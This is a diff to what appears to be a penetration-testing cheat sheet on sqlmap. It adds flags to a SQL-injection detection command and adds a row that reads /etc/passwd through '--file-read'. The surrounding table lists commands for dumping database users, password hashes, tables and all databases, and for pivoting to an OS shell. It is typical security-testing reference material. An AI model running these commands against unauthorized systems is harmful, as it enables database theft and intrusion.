@@ -59,7 +59,7 @@ Try the simpler/faster techniques (of `BEUSTQ`) first to find easy wins, but
 
 **NOTE: remember this will miss techniques!**
 ```bash
-sqlmap -u "<URL>" --risk 3 --level 5 --technique=BEU 
+sqlmap -u "<URL>" --risk 3 --level 5 --technique=BEUS --batch
 ```
 
 #### Blind Boolean
@@ -122,21 +122,22 @@ sqlmap -u "<URL>" --dns-domain=<DOMAIN>
 
 ## Database Enumeration
 
-| Option                                          | Purpose                                                                    |
-| :---------------------------------------------- | :------------------------------------------------------------------------- |
-| `--banner --current-user --current-db --is-dba` | DB version, user, DB name, is DBA.                                         |
-| `--users --passwords`                           | Enumerate DB users and hashes (needs high priv).                           |
-| `--dbs`                                         | List all databases.                                                        |
-| `-D <DB> --tables`                              | List tables in database.                                                   |
-| `-D <DB> -T <TABLE> --columns`                  | List columns in table.                                                     |
-| `-D <DB> -T <TABLE> --dump`                     | Dump entire table.                                                         |
-| `-C col1,col2 --dump`                           | Dump only specified columns.                                               |
-| `--start=N --stop=M --dump`                     | Dump rows N through M.                                                     |
-| `--where="cond" --dump`                         | Dump only rows matching condition.                                         |
-| `--dump-all --exclude-sysdbs`                   | Dump all DBs except system (e.g. information_schema, mysql).               |
-| `--is-dba` true →                               | Pivot to `--os-shell` / `--file-read` (RCE).                               |
-| Dump path                                       | `~/.local/share/sqlmap/output/`; use `--dump-format=sqlite` for large DBs. |
-| DBMS root ≠ Linux root                          | DB root can write anywhere only if DBMS runs as Linux root.                |
+| Option                                                       | Purpose                                                                    |
+| :----------------------------------------------------------- | :------------------------------------------------------------------------- |
+| `--banner --current-user --current-db --is-dba --privileges` | DB version, user, DB name, is DBA, privileges.                             |
+| `--users --passwords`                                        | Enumerate DB users and hashes (needs high priv).                           |
+| `--dbs`                                                      | List all databases.                                                        |
+| `-D <DB> --tables`                                           | List tables in database.                                                   |
+| `-D <DB> -T <TABLE> --columns`                               | List columns in table.                                                     |
+| `-D <DB> -T <TABLE> --dump`                                  | Dump entire table.                                                         |
+| `-C col1,col2 --dump`                                        | Dump only specified columns.                                               |
+| `--start=N --stop=M --dump`                                  | Dump rows N through M.                                                     |
+| `--where="cond" --dump`                                      | Dump only rows matching condition.                                         |
+| `--dump-all --exclude-sysdbs`                                | Dump all DBs except system (e.g. information_schema, mysql).               |
+| `--is-dba` true →                                            | Pivot to `--os-shell` / `--file-read` (RCE).                               |
+| `--file-read /etc/passwd`                                    | Check file read access                                                     |
+| Dump path                                                    | `~/.local/share/sqlmap/output/`; use `--dump-format=sqlite` for large DBs. |
+| DBMS root ≠ Linux root                                       | DB root can write anywhere only if DBMS runs as Linux root.                |
 
 **OS Exploitation Options**
 
